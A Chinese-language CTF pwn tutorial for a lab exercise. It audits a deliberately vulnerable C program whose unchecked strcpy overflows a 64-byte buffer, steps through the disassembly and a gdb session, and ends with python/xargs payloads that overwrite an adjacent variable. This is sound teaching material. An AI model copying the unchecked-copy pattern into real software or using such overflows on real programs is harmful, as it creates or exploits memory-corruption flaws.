刚开始接触pwn的朋友在做pwn练习时可能会有这样的疑问，怎么做到精确覆盖变量数据呢？

我们做pwn练习之前需要先知道：命令行参数C语言的main函数拥有两个参数，为int类型的argc参数，以及char**类型argv参数。其中argc参数的值表示命令行参数的个数，而argv则指向一个字符串数组，该数组存储了具体的命令行参数的内容。

这里就用今天的实验，给大家介绍一下！

 **本文涉及相关实验：**[《CTF
PWN练习之精确覆盖变量数据》](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014110113362900001&pk_campaign=freebuf-wemedia)（在掌握大小端字节序表示法的基础上，通过精心构造的输入数据溢出缓冲区，实现对modified变量的值进行精确覆盖，以达到修改程序执行逻辑的目的。）

看下面的例子 打印命令行参数信息的示例代码（位于/home/test/2目录下）：

    
    
    #include <stdio.h>
    
    int main(int argc, char** argv)
    
    {
    
    int i;
    
    for (i = 0; i < argc; ++i)
    
    {
    
    printf("argv[%d] = %s\n", i, argv[i]);
    
    }
    
    return 0;
    
    }

注意程序本身的名字为命令行的第一个参数。编译这段代码生成test程序，然后在命令行下执行，尝试传入命令行参数，如：./test hello world
cmdline，可以看到程序打印出了具体的命令行参数信息：

![图片1.png](https://image.3001.net/images/20210317/1615967982_6051b6ee4db3a9d60e525.png!small)

xargs命令Linux的xargs命令可以将输入数据当做命令行参数传给指定的程序。比如执行命令python -c "print 'AAA BBB
CCC'" | xargs ./test后，输出：

![图片2.png](https://image.3001.net/images/20210317/1615967982_6051b6eec768228c5f8d7.png!small)

python语句执行后输出AAA BBB
CCC，通过管道操作作为xargs命令的输入，而xargs将其作为test程序的命令行参数，因此test程序会把这些信息打印出来。

小白：就是我们借助xargs可以把输入数据当成命令行参数输给这个程序。

大东:对的，另外还需要讲的是一个字节序
字节顺序，又称端序或尾序（英语：Endianness）。对于内存中存储的0x11223344这样一个值，从低地址往高地址方向的每一个字节来看，其内容在内存里的分布可能为0x11,0x22,0x33,0x44，也可能为0x44,0x33,0x22,0x11。

这就涉及到两种存储规则：大端格式和小端格式。示意图如下图所示：

![图片3.png](https://image.3001.net/images/20210317/1615967983_6051b6ef5247a586f250d.png!small)

0x11223344中的最高的字节为0x11，最低的字节为0x44，我们只要记住小端格式是“高存高，低存低”的规律，就很好的理解了。即小端格式中，高位字节存储于内存的高地址处，而低位字节存储于内存的低地址处。

Intel、AMD等系列的处理器都是小端格式的。

题目描述：

主机/home/test/2目录下有一个pwn2程序，这个程序会对传入的命令行参数进行处理，通过构造特定的命令行参数数据可以对程序发起溢出攻击，成功会提示
**Congratulations, you pwned it.** ，失败则会提示**Please try again.**的提示信息。

第一步源码审计使用cd /home/test/2切换到程序所在目录，执行cat pwn2.c即可看到源代码：

    
    
    #include <stdio.h>
    
    #include <string.h>
    
    #include <stdlib.h>
    
    int main(int argc, char** argv)
    
    {
    
    int modified;
    
    char buffer[64];
    
    if (argc == 1)
    
    {
    
    printf("please specify an argument\n");
    
    exit(1);
    
    }
    
    modified = 0;
    
    strcpy(buffer, argv[1]); // 引发缓冲区溢出
    
    if (modified == 0x61626364)
    
    {
    
    printf("Congratulations, you pwned it.\n");
    
    }
    
    else
    
    {
    
    printf("Please try again, you got 0x%08X\n", modified);
    
    }
    
    return 0;
    
    }

这源码要怎么pwn掉它呢？

我们可以尝试一个姿势，使用strcpy函数复制字符串时，并不会对目标缓冲区的长度进行检查，当源字符串的长度超过目标缓冲区的长度时会引发缓冲区溢出。这里当输入的超长的命令行参数数据时，将会产生缓冲区溢出，数据覆盖buffer后会继续覆盖modified变量。

这个程序有一个条件modified ==，那么要多少才能pwn出去呢？0x61626364

我们来继续分析，执行gdb pwn2即可开始通过gdb对pwn2进行调试，现在我们需要阅读main函数的汇编代码，在gdb中执行disas
main命令即可：

 **下面是对main函数中的汇编代码的解释** ：

> 0x080482a0 <+0>: push %ebp
>
> 0x080482a1 <+1>: mov %esp,%ebp
>
> 0x080482a3 <+3>: and $0xfffffff0,%esp
>
> ; esp = esp - 0x60，即在栈上分配0x60）字节的空间
>
> 0x080482a6 <+6>: sub $0x60,%esp

; 判断命令行参数的个数是否为1

> 0x080482a9 <+9>: cmpl $0x1,0x8(%ebp)
>
> 0x080482ad <+13>: jne 0x80482c7 <main+39>
>
> 0x080482af <+15>: movl $0x80b3dac,(%esp)
>
> 0x080482b6 <+22>: call 0x80493c0
>
> 0x080482bb <+27>: movl $0x1,(%esp)
>
> 0x080482c2 <+34>: call 0x8048e90
>
> ; 命令参数个数不是1，说明传入了命令行参数
>
> ; modified变量位于esp + 0x5C处，将其初始化为0
>
> 0x080482c7 <+39>: movl $0x0,0x5c(%esp)
>
> ; 通过ebp + 0xC获取argv参数的值
>
> 0x080482cf <+47>: mov 0xc(%ebp),%eax
>
> ; eax = eax + 4
>
> 0x080482d2 <+50>: add $0x4,%eax
>
> ; 取argv[1]的值
>
> 0x080482d5 <+53>: mov (%eax),%eax
>
> ; 将argv[1]作为strcpy的第二个参数值
>
> 0x080482d7 <+55>: mov %eax,0x4(%esp)
>
> ; buffer位于esp + 0x1C处，buffer作为strcpy的第一个参数值
>
> 0x080482db <+59>: lea 0x1c(%esp),%eax
>
> 0x080482df <+63>: mov %eax,(%esp)
>
> ; 调用strcpy进行字符串复制
>
> 0x080482e2 <+66>: call 0x80525b0
>
> ; 判断modified的值是否为0x61626364
>
> 0x080482e7 <+71>: cmpl $0x61626364,0x5c(%esp)
>
> ; 不相等则跳转并输出失败信息
>
> 0x080482ef <+79>: jne 0x80482ff <main+95>
>
> ; 输出成功提示信息
>
> 0x080482f1 <+81>: movl $0x80b3dc8,(%esp)
>
> 0x080482f8 <+88>: call 0x80493c0
>
> 0x080482fd <+93>: jmp 0x8048314 <main+116>
>
> 0x080482ff <+95>: mov $0x80b3de8,%eax
>
> 0x08048304 <+100>: mov 0x5c(%esp),%edx
>
> 0x08048308 <+104>: mov %edx,0x4(%esp)
>
> 0x0804830c <+108>: mov %eax,(%esp)
>
> 0x0804830f <+111>: call 0x8049390
>
> 0x08048314 <+116>: mov $0x0,%eax
>
> 0x08048319 <+121>: leave
>
> 0x0804831a <+122>: ret

通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x1C处，而modified位于esp+0x5C处，两个地址的距离为0x5C - 0x1C
=
0x40，即64，刚好为buffer数组的大小。因此当我们输入的数据超过64字节时，modified变量就可以被覆盖，但需要控制modified变量的值还需要小心的构造命令行参数。

下面在gdb中进行验证，在gdb中执行b * 0x080482e7命令对strcpy的下一条指令下一个断点：

![图片5.png](https://image.3001.net/images/20210317/1615967983_6051b6efcde15e2ccb663.png!small)

在gdb中执行r命令，如下（r后面的数据为64个A以及1234）：

r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234

即r命令后加上空格可以接一个命令行参数，用于传递给被调试的程序。按下Enter键程序就在断点处断下了：

![图片6.png](https://image.3001.net/images/20210317/1615967984_6051b6f0449b6dabbfa53.png!small)

在gdb中输入x
$esp+0x5C，查看modified变量的值已经被修改成了0x34333231，而0x31为字符’1’的ASCII值，0x32为字符’2’的ASCII值，0x33为字符’3’的ASCII值，0x34为字符’4’的ASCII值：

![图片7.png](https://image.3001.net/images/20210317/1615967984_6051b6f0ba9e8deb296c6.png!small)

使用x /4xb
$esp+0x5C命令，以字节为单位查看内存中0x34333231的表示（其中/4xb用于控制输出格式，4表示4个长度单位，x表示以16进制方式显示，b表示单位为字节）：

![图片8.png](https://image.3001.net/images/20210317/1615967985_6051b6f13a20b2bf76d66.png!small)

现在modified变量的值已经被修改成0x34333231了，结合我们的输入数据‘A….A1234’，1234为低地址往高地址方向，可以判断这是小端格式的表示法。

在gdb中输入c命令就可以让程序继续执行，看到输出了错误的提示信息：

![图片9.png](https://image.3001.net/images/20210317/1615967985_6051b6f1a1ff710246a36.png!small)

现在我们只要合理控制命令行参数的第65~68字节的内容，就可以成功发起溢出攻击了。

通过上面的步骤我们已经知道，只要合理控制命令行参数的第65~68字节的内容，就可以成功发起溢出攻击了。因为目标机器采用小端格式存储数据，而if语句分支要求modified的值为0x61626364时才通过判断，因此我们构造的数据应该为\x64\x63\x62\x61。如果你还没有退出gdb，输入q命令就可以退出gdb。下面通过python语句构造输入数据，然后通过xargs传给pwn2程序，执行命令：

    
    
    python -c "print 'A'*64+'\x64\x63\x62\x61'" | xargs ./pwn2

![图片10.png](https://image.3001.net/images/20210317/1615967986_6051b6f223c521b3268a8.png!small)

看到已经成功发起了溢出攻击，程序被PWN掉啦！

其实0x61为字符a的ASCII值，因此输入如下的命令同样能达到攻击效果：

    
    
    python -c "print 'A'*64+'dcba'" | xargs ./pwn2

![图片11.png](https://image.3001.net/images/20210317/1615967986_6051b6f29cefad7740c80.png!small)

这次的实验真的很费脑筋，分析处理了好多数据，才得到结果。

